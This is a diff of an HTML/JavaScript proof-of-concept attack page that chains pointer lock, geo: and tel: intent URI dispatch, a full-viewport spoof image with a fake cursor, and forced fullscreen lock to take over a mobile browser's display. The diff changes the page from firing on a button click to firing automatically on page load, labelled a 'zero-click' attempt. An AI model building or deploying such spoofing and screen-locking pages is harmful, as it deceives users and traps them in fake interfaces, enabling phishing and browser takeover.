@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
-    <title>Ultimate Full-Chain Multi-Vector Takeover PoC</title>
+    <title>Ultimate Auto-Trigger Full-Chain PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -147,9 +147,9 @@
   <body>
     <div id="fullscreenFakeCursor">
       <div>
-        [ULTIMATE_FULL_CHAIN_ACTIVE]<br><br>
-        Multi-vector execution matrix engaged.<br>
-        Status: Forcing full viewport lockdown.
+        [AUTO_TRIGGER_CHAIN_ACTIVE]<br><br>
+        Attempting zero-click matrix execution.<br>
+        Status: Awaiting user context activation.
       </div>
     </div>
 
@@ -164,13 +164,13 @@
         <div class="overlap-text" id="overlapContent">
           [SECURE_CONTEXT_OVERLAP_ACTIVE]<br>
           Target DOM Selection Overlap initialized successfully.<br>
-          Status: Forcing context focus and deep container locking...
+          Status: Forcing context focus and auto-trigger binding...
         </div>
       </div>
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE ULTIMATE FULL CHAIN</button>
-        <div class="info" id="statusInfo">Status: Ready for interaction.</div>
+        <button id="execBtn">INITIALIZE AUTO-TRIGGER CHAIN</button>
+        <div class="info" id="statusInfo">Status: Ready for auto-execution attempt.</div>
       </div>
     </div>
 
@@ -178,20 +178,20 @@
       let execButton = document.getElementById("execBtn");
       let statusInfo = document.getElementById("statusInfo");
 
-      execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Executing ultimate multi-vector full chain...";
-        this.style.display = "none";
+      async function runChainSequence() {
+        statusInfo.innerText = "Status: Executing automated full-chain sequence...";
+        execButton.style.display = "none";
 
         try {
           // 1. Pointer Lock Integration
           let plElement = document.getElementById("pointerLockElement");
           if (plElement && plElement.requestPointerLock) {
             await plElement.requestPointerLock().catch((err) => {
-              console.debug("PointerLock chained catch:", err.message);
+              console.debug("PointerLock restricted/denied:", err.message);
             });
           }
 
-          // 2. Multi-Protocol Intent URI Dispatcher Chaining (geo: dan tel:)
+          // 2. Multi-Protocol Intent URI Dispatcher Chaining
           let protocols = ["geo:0,0?q=apple.com", "tel:+123456789"];
           protocols.forEach((proto, index) => {
             setTimeout(() => {
@@ -221,15 +221,15 @@
             }
           }
 
-          // 4. Deployment Visual Spoof Layer dengan ukuran maksimal viewport
+          // 4. Deployment Visual Spoof Layer
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          statusInfo.innerText = "Status: Multi-intent dispatched. Engaging Fullscreen lock...";
+          statusInfo.innerText = "Status: Vectors dispatched. Forcing Fullscreen lock...";
 
-          // 5. Aggressive Fullscreen Chaining dengan Jeda Optimal
+          // 5. Aggressive Fullscreen Chaining
           setTimeout(async () => {
             let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
             
@@ -245,7 +245,7 @@
                 try {
                   await requestFS.call(fsElement);
                 } catch (e) {
-                  console.debug("Fullscreen chain fallback error:", e.message);
+                  console.debug("Fullscreen restriction notice:", e.message);
                 }
               }
             }
@@ -255,14 +255,25 @@
               container.style.display = "none";
             }
             
-            statusInfo.innerText = "Status: Ultimate full chain active & locked.";
+            statusInfo.innerText = "Status: Auto-trigger chain sequence completed.";
           }, 250);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Chaining execution error: " + err.message;
+          statusInfo.innerText = "Status: Execution error: " + err.message;
           execButton.style.display = "block";
         }
-      };
+      }
+
+      // Event listener manual pada tombol
+      execButton.onclick = runChainSequence;
+
+      // Percobaan 0-Click Auto-Trigger saat dokumen selesai dimuat
+      window.addEventListener("DOMContentLoaded", () => {
+        setTimeout(() => {
+          // Memanggil fungsi secara otomatis tanpa menunggu klik manual (akan dibatasi oleh kebijakan browser jika tanpa gestur)
+          runChainSequence();
+        }, 500);
+      });
     </script>
   </body>
 </html>
